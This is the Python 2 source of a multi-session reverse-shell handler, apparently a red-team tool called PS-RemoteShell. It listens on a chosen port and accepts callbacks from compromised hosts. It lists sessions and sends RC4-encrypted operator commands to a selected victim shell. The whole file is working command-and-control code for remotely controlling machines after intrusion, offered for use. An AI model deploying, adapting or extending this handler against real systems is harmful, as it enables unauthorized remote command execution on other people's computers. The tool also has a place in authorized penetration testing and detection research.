# PS-RemoteShell Python Client
# Author: Mr.Un1k0d3r RingZer0 Team
# Threading is terrible 
# TODO:
#   session clean up
#   better threads management

import sys
import socket
import time
import threading 

version = "1.1"
buffer_size = 4096
recv_timeout = 0.2

sessions = {}
max_session = 20

class RC4:

	def __init__(self, plaintext, key):
		self.output = ""
		key = [ord(c) for c in key]
		S = self.KSA(key)
		keystream = self.PRGA(S)
		for c in plaintext:
			self.output = self.output + chr(ord(c) ^ keystream.next())
		
	def KSA(self, key):
		keylength = len(key)
		S = range(256)
		j = 0
		for i in range(256):
			j = (j + S[i] + key[i % keylength]) % 256
			S[i], S[j] = S[j], S[i]

		return S

	def PRGA(self, S):
		i = 0
		j = 0
		while True:
			i = (i + 1) % 256
			j = (j + S[i]) % 256
			S[i], S[j] = S[j], S[i] 

			K = S[(S[i] + S[j]) % 256]
			yield K
			
	def get_data(self):
		return self.output

class Networking:
			
	def __init__(self):
		for i in range(1, max_session + 1):
			session = {}
			sessions["sess_" + str(i)] = {}
			sessions["sess_" + str(i)]["conn"] = None
			
	def recvall(self, conn, size):
		buffer = ""
		current_buffer_size = 4096
		while size > 0:
			if size < current_buffer_size:
				current_buffer_size = size;
			buffer += conn.recv(current_buffer_size)
			time.sleep(recv_timeout)
			size -= current_buffer_size
		return buffer

	def accept_connection(self, s):
		s.listen(max_session)
		while True:
			conn, addr = s.accept()
			session_id = self.add_new_connection(conn, "Callback from %s:%d" % (addr[0], addr[1]))
			print "[+] *** NEW Callback from %s:%d. Session ID:%s" % (addr[0], addr[1], session_id)
			
	def add_new_connection(self, conn, data):
		for key in sessions.keys():
			if sessions[key]["conn"] == None:
				sessions[key]["conn"] = conn
				sessions[key]["data"] = data
				return key.replace("sess_", "")
				
class NetThread(threading.Thread):
    def __init__(self, target, *args):
        self._target = target 
        self._args = args
        threading.Thread.__init__(self)
 
    def run(self):
        self._target(*self._args)
		
def show_help():
	print "Help\n------\nlist\t\tList all sessions\ninteract id\tInteract with a session (Example: interact 1)\nbackground\tReturn to the main console\n"
		
if __name__ == "__main__":
	print "Multi PS-RemoteShell Python Client v%s\nMr.Un1k0d3r RingZer0 Team\n\n" % version
	if len(sys.argv) < 5:
		print "Usage: %s ip port key number_of_session" % sys.argv[0]
		exit(0)
		
	old = None
	ip = sys.argv[1]
	port = int(sys.argv[2])
	rc4_key = sys.argv[3]
	max_session = int(sys.argv[4])
	network = Networking()
	accept_loop = network.accept_connection
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))

	show_help()
	print "[+] Setup to receive up to %d clients" % max_session
	print "[*] Waiting for a connection...\n\n"
	
	thread = NetThread(accept_loop, s)
	thread.start()

	try:
		while True:
			option = raw_input("(Main Console)>>> ")
			if option == "list":
				for key in sessions.keys():
					if not sessions[key]["conn"] == None:
						print "Session\t\tHost\n---------\t------"							
						print "%s\t\t%s" % (key.replace("sess_", ""), sessions[key]["data"])
				print "\n"
			if option == "exit":
				exit(0)
			if option.split(" ")[0] == "interact":
				session_id = "sess_" + str(option.split(" ")[1])
				if session_id in sessions:
					if not sessions[session_id]["conn"] == None:
						conn = sessions[session_id]["conn"]
						data = True
						while data:
							if old == None:
								data = conn.recv(buffer_size)
								data = RC4(data, rc4_key)
								data = data.get_data()
								if data[:11] == "PACKETSIZE=":
									time.sleep(recv_timeout)
									data = network.recvall(conn, int(data[11:]))
									data = RC4(data, rc4_key)
									data = data.get_data()
							else:
								data = old
								old = None
							cmd = raw_input(data)
							
							if cmd == "background":
								old = data
								data = False
							elif cmd == "help":
								show_help()
							else:
								if cmd == "":
									cmd = ";"
								cmd = RC4(cmd, rc4_key)
								cmd = cmd.get_data()
								conn.send(cmd)
	except KeyboardInterrupt:
		s.close()
		exit(0)
